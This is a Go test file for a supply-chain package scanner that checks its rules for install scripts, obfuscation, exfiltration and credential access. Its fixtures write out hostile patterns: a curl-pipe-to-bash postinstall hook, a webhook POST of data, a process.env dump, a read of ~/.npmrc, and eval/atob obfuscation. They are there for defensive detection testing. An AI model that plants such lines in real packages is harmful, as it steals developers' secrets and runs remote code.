package heuristics

import (
	"strings"
	"testing"
	"time"

	"github.com/JAugusto42/sandtrap/internal/analyzer"
	"github.com/JAugusto42/sandtrap/internal/registry"
)

// Inert synthetic fixtures modeled on the *shape* of real campaign payloads.
// None of this is functional malware — endpoints are invalid and code is
// non-executable fragments used purely to exercise the detection rules.

func art(meta registry.Metadata, files ...registry.File) *registry.Artifact {
	return &registry.Artifact{Meta: meta, Files: files}
}

func hasFinding(fs []analyzer.Finding, rule string, minSev analyzer.Severity) bool {
	for _, f := range fs {
		if f.RuleID == rule && f.Severity >= minSev {
			return true
		}
	}
	return false
}

func TestInstallScriptsCriticalOnPipeToShell(t *testing.T) {
	a := art(registry.Metadata{InstallScripts: map[string]string{
		"postinstall": "curl -s https://invalid.example/x.sh | bash",
	}})
	fs := (InstallScripts{}).Check(a)
	if !hasFinding(fs, "install-scripts", analyzer.SevCritical) {
		t.Fatalf("expected CRITICAL for pipe-to-shell hook, got %+v", fs)
	}
}

func TestInstallScriptsBenignAllowlist(t *testing.T) {
	a := art(registry.Metadata{InstallScripts: map[string]string{
		"install": "node-gyp rebuild",
	}})
	fs := (InstallScripts{}).Check(a)
	if hasFinding(fs, "install-scripts", analyzer.SevMedium) {
		t.Fatalf("node-gyp rebuild should be LOW, got %+v", fs)
	}
}

func TestPrepareHookIsInfoOnly(t *testing.T) {
	a := art(registry.Metadata{InstallScripts: map[string]string{
		"prepare": "husky install",
	}})
	fs := (InstallScripts{}).Check(a)
	if hasFinding(fs, "install-scripts", analyzer.SevLow) {
		t.Fatalf("prepare hook must not exceed INFO on registry installs, got %+v", fs)
	}
}

func TestObfuscationStackedTechniques(t *testing.T) {
	// eval chain + long base64 blob + hex-mangled identifiers, stacked the
	// way JS obfuscator output looks.
	payload := `var _0xab12=["a"];var _0xcd34=_0xab12;` +
		strings.Repeat(`var _0x1a2b=1;`, 25) +
		`eval(atob("` + strings.Repeat("QUJ+RA/z", 30) + `"));` +
		`new Function(String.fromCharCode(99,111));`
	a := art(registry.Metadata{}, registry.File{Path: "index.js", Content: []byte(payload)})
	fs := (Obfuscation{}).Check(a)
	if !hasFinding(fs, "obfuscation", analyzer.SevHigh) {
		t.Fatalf("expected >=HIGH for stacked obfuscation, got %+v", fs)
	}
}

func TestObfuscationIgnoresSingleTechnique(t *testing.T) {
	// lodash-style: repeated Function('return this') but nothing else.
	code := strings.Repeat("var root = Function('return this')();\n", 3) +
		strings.Repeat("function add(a, b) { return a + b; }\n", 50)
	a := art(registry.Metadata{}, registry.File{Path: "lodash.js", Content: []byte(code)})
	if fs := (Obfuscation{}).Check(a); len(fs) != 0 {
		t.Fatalf("single-technique repetition must not flag, got %+v", fs)
	}
}

func TestExfiltrationWebhook(t *testing.T) {
	code := `fetch("https://webhook.site/00000000-dead-beef", {method:"POST", body: data})`
	a := art(registry.Metadata{}, registry.File{Path: "lib/util.js", Content: []byte(code)})
	fs := (Exfiltration{}).Check(a)
	if !hasFinding(fs, "exfiltration", analyzer.SevCritical) {
		t.Fatalf("expected CRITICAL for webhook.site endpoint, got %+v", fs)
	}
}

func TestExfiltrationEnvDump(t *testing.T) {
	code := `const b = JSON.stringify(process.env); send(b);`
	a := art(registry.Metadata{}, registry.File{Path: "steal.js", Content: []byte(code)})
	fs := (Exfiltration{}).Check(a)
	if !hasFinding(fs, "exfiltration", analyzer.SevHigh) {
		t.Fatalf("expected HIGH for bulk env capture, got %+v", fs)
	}
}

func TestExfiltrationIgnoresPrivateIP(t *testing.T) {
	code := `const dev = "http://127.0.0.1:8080/health";`
	a := art(registry.Metadata{}, registry.File{Path: "dev.js", Content: []byte(code)})
	for _, f := range (Exfiltration{}).Check(a) {
		if f.Title == "hardcoded raw-IP endpoint" {
			t.Fatalf("loopback must not flag: %+v", f)
		}
	}
}

func TestCredentialAccessNpmrc(t *testing.T) {
	code := `const tok = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");`
	a := art(registry.Metadata{}, registry.File{Path: "grab.js", Content: []byte(code)})
	fs := (CredentialAccess{}).Check(a)
	if !hasFinding(fs, "credential-access", analyzer.SevHigh) {
		t.Fatalf("expected HIGH for .npmrc read, got %+v", fs)
	}
}

func TestCredentialAccessNetrcIsContextual(t *testing.T) {
	code := `auth = read_netrc("~/.netrc")`
	a := art(registry.Metadata{}, registry.File{Path: "http/auth.py", Content: []byte(code)})
	fs := (CredentialAccess{}).Check(a)
	if hasFinding(fs, "credential-access", analyzer.SevHigh) {
		t.Fatalf(".netrc must be MEDIUM (context-dependent), got %+v", fs)
	}
	if !hasFinding(fs, "credential-access", analyzer.SevMedium) {
		t.Fatalf(".netrc should still be reported at MEDIUM, got %+v", fs)
	}
}

func TestFreshPublishWindows(t *testing.T) {
	a := art(registry.Metadata{
		PublishedAt:      time.Now().Add(-2 * time.Hour),
		FirstPublishedAt: time.Now().Add(-10 * 24 * time.Hour),
	})
	fs := (FreshPublish{}).Check(a)
	if !hasFinding(fs, "fresh-publish", analyzer.SevMedium) {
		t.Fatalf("expected MEDIUM for <24h publish + <30d package, got %+v", fs)
	}
}
